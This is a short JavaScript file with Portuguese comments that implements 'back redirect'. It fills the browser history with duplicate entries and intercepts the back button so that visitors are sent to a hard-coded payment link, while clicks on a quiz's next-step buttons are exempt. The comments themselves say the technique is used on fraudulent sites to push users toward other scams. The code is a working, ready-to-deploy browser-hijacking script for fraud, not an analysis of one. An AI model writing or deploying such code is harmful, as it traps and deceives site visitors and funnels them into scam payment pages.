/**
 * Script que implementa a técnica de "back redirect"
 * Esta técnica é usada em sites fraudulentos para capturar o evento de "voltar" do navegador
 * e redirecionar o usuário para outro site de fraude ao invés de voltar à página anterior
 */

const link = 'https://pay.speedsellx.com/6876DDD959482';
let ignoreNextPop = false;

function setBackRedirect(url) {
  let urlBackRedirect = url;
  urlBackRedirect = urlBackRedirect.trim() +
    (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
    document.location.search.replace('?', '').toString();

  // Manipulação do histórico para capturar eventos de "voltar"
  history.pushState({}, '', location.href);
  history.pushState({}, '', location.href);
  history.pushState({}, '', location.href);

  window.addEventListener('popstate', () => {
    if (ignoreNextPop) {
      ignoreNextPop = false;
      return;
    }

    setTimeout(() => {
      location.href = urlBackRedirect;
    }, 1);
  });
}

// Bloquear redirecionamento se clicarmos em qualquer botão do quiz
document.addEventListener('click', (e) => {
  if (e.target.closest('.next-step')) {
    ignoreNextPop = true;
    history.go(1); // evita acionar o redirecionamento
  }
});

setBackRedirect(link); 